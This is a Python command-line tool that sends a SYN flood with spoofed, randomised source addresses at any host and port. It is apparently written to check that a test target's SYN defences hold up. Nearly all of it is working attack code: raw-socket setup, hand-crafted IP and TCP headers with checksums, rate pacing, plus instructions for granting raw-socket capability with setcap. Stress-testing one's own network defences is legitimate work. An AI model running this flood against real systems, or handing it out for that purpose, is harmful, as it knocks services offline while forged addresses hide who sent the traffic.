#!/usr/bin/env python3
"""A SYN flood at one TCP port, from addresses that do not answer.

This is the attacker RFC 4987 describes, made deterministic: a stream of TCP
SYN segments whose source address is forged fresh for every one, so nothing
this machine sends back is ever completed and every one is a half-open
connection the target has to account for on its own.  It is what proves the
target's SYN defence is doing something -- a stack that pins a socket or a
packet per SYN stops answering, and one that holds 76 bytes that expire does
not.

  synflood.py HOST --port N [--seconds N] [--pps N] [--source-net A.B.C.D/nn]
              [--report FILE]

The forged sources are drawn from --source-net, a range this machine does not
own and will not answer ARP for, so the SYN-ACKs the target sends go nowhere
and no handshake ever completes.  Do NOT point it at a real subnet: a source
that is a live host would receive the SYN-ACK and RST it, which is a different
test.  10.99.0.0/16 is the default and is meant to be dead.

It needs a raw socket, which needs CAP_NET_RAW.  The lab pattern is a
capability-carrying private copy of the interpreter, the same shape as
tc-cap and tcpdump-cap:

  cp "$(command -v python3)" ~/python3-cap
  sudo setcap cap_net_raw+ep ~/python3-cap

Output is one key=value line on stdout, so a caller may read it without
parsing prose:

  synflood: sent=48000 seconds=30 pps=1600 target=192.168.1.240:8080 rc=0

Exit 0 when the flood ran, 1 when the socket could not be opened (no
capability), 2 for usage.

SPDX-License-Identifier: MIT
"""

import argparse
import os
import random
import socket
import struct
import sys
import time


def checksum(data):
    """The one's-complement sum every IP and TCP checksum is.

    Pad to an even length, sum 16-bit words, fold the carries, invert.
    """
    if len(data) & 1:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def ip_header(src, dst, payload_len, ident):
    """A 20-byte IPv4 header carrying TCP.

    The kernel fills the header checksum for a SOCK_RAW/IPPROTO_TCP socket on
    Linux, but not on every path, so it is computed here rather than left
    zero -- a wrong one is dropped by the first router and the flood would
    quietly hit nothing.
    """
    version_ihl = (4 << 4) | 5
    tos = 0
    total_len = 20 + payload_len
    flags_frag = 0
    ttl = 64
    proto = socket.IPPROTO_TCP
    check = 0
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, tos, total_len, ident, flags_frag,
        ttl, proto, check,
        socket.inet_aton(src), socket.inet_aton(dst),
    )
    check = checksum(header)
    return struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, tos, total_len, ident, flags_frag,
        ttl, proto, check,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def tcp_syn(src, dst, src_port, dst_port, seq):
    """A bare SYN, with the options a real client offers.

    MSS, window scale, SACK-Permitted and a timestamp: a SYN with no options
    is not what the defence has to carry across a cookie, so the flood sends
    the ones that make the target negotiate them.  A target that dropped the
    options under load would still pass a flood of optionless SYNs.
    """
    # The canonical Linux SYN option layout, twenty bytes, five words.
    options = b"".join([
        b"\x02\x04\x05\xb4",                       # MSS 1460
        b"\x04\x02",                               # SACK-Permitted
        b"\x08\x0a" + struct.pack("!II", seq, 0),  # timestamp, 10 bytes
        b"\x01",                                   # NOP, to align the next
        b"\x03\x03\x07",                           # window scale 7
    ])
    assert len(options) == 20                      # 5 option words
    data_offset_words = 5 + (len(options) // 4)    # 20-byte header + options
    offset_flags = (data_offset_words << 12) | 0x002  # SYN
    window = 64240

    tcp = struct.pack(
        "!HHIIHHHH",
        src_port, dst_port, seq, 0,
        offset_flags, window, 0, 0,
    ) + options

    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(src), socket.inet_aton(dst),
        0, socket.IPPROTO_TCP, len(tcp),
    )
    check = checksum(pseudo + tcp)
    tcp = struct.pack(
        "!HHIIHHHH",
        src_port, dst_port, seq, 0,
        offset_flags, window, check, 0,
    ) + options
    return tcp


def net_hosts(cidr):
    """The forged-source range as (base, count), so an address is base+random."""
    addr, bits = cidr.split("/")
    bits = int(bits)
    base = struct.unpack("!I", socket.inet_aton(addr))[0]
    base &= (0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF
    return base, (1 << (32 - bits))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--seconds", type=int, default=30)
    ap.add_argument("--pps", type=int, default=2000)
    ap.add_argument("--source-net", default="10.99.0.0/16")
    ap.add_argument("--report", default=None)
    args = ap.parse_args()

    try:
        dst = socket.gethostbyname(args.host)
    except OSError as exc:
        print("synflood: cannot resolve %s: %s" % (args.host, exc),
              file=sys.stderr)
        return 2

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                             socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("synflood: no raw socket -- run under a python with "
              "cap_net_raw+ep (see the header)", file=sys.stderr)
        return 1
    except OSError as exc:
        print("synflood: raw socket: %s" % exc, file=sys.stderr)
        return 1

    base, span = net_hosts(args.source_net)
    rng = random.Random(1)

    interval = 1.0 / args.pps if args.pps > 0 else 0.0
    deadline = time.monotonic() + args.seconds
    sent = 0
    ident = 1
    next_send = time.monotonic()

    while time.monotonic() < deadline:
        # A forged source, a random ephemeral port, a random sequence number:
        # every SYN is a distinct four-tuple, so a target that keyed a cache
        # on the tuple cannot fold them together.
        offset = rng.randint(1, span - 2) if span > 2 else 1
        src = socket.inet_ntoa(struct.pack("!I", (base + offset) & 0xFFFFFFFF))
        src_port = rng.randint(1024, 65535)
        seq = rng.randint(1, 0xFFFFFFFF)

        tcp = tcp_syn(src, dst, src_port, args.port, seq)
        packet = ip_header(src, dst, len(tcp), ident & 0xFFFF) + tcp
        ident += 1

        try:
            sock.sendto(packet, (dst, 0))
            sent += 1
        except OSError:
            # A send buffer full under a high rate is not a failure of the
            # flood; it is the flood.  Pace and carry on.
            pass

        if interval:
            next_send += interval
            slack = next_send - time.monotonic()
            if slack > 0:
                time.sleep(slack)

    sock.close()

    elapsed = args.seconds
    pps = sent // elapsed if elapsed else sent
    line = ("synflood: sent=%d seconds=%d pps=%d target=%s:%d rc=0"
            % (sent, elapsed, pps, dst, args.port))
    print(line)
    if args.report:
        try:
            with open(args.report, "w", encoding="ascii") as handle:
                handle.write(line + "\n")
        except OSError:
            pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
